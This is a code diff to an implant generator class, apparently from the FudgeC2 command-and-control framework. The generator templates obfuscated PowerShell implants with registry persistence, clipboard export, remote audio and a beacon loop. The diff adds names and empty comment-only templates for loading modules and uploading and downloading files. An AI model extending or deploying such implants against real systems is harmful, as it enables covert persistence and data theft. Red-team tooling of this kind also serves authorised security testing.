@@ -25,7 +25,9 @@ class ImplantGenerator:
         "obf_reg_key_name": "FudgeC2Persistence",
         "obf_callback_url": "url",
         "obf_callback_reason": "callback_reason",
-        "obf_get_clipboard": "export-clipboard"
+        "obf_get_clipboard": "export-clipboard",
+        "obf_load_module":"download-file",
+        "obf_upload_file":"upload-file"
         }
 
     # -- This is to be finished with PoC WorkWork audio
@@ -57,6 +59,17 @@ function {{ ron.obf_collect_sysinfo }}(){
 
     random_function = '''
 function {{ ron.rnd_function }} () {}
+'''
+    load_module ='''
+# Loading external scripts  
+'''
+
+    upload_file ='''
+# Uploading files to client
+'''
+
+    download_file = '''
+# Download files from client
 '''
 
     # -- This needs improvement, it only supports http persistence.
@@ -90,7 +103,7 @@ function {{ ron.obf_builtin_command }}($data){
         {{ ron.obf_create_persistence }}
     } elseif ($a -eq "PS"){
         {{ ron.obf_remote_play_audio }}($b)
-    } elseif ($a -eq "EC"){
+    } elseif ($a -eq "EC"){ 
         {{ ron.obf_get_clipboard }} 
     } else {
         $Script:tr = "0"
@@ -229,7 +242,10 @@ while($true){
                              self.fde_func_a,
                              self.fde_func_b,
                              self.create_persistence,
-                             self.select_protocol]
+                             self.select_protocol,
+                             self.load_module,
+                             self.upload_file,
+                             self.download_file]
 
         # Checks which protocols should be embedded into the implant.
         if implant_data['comms_http'] is not None:
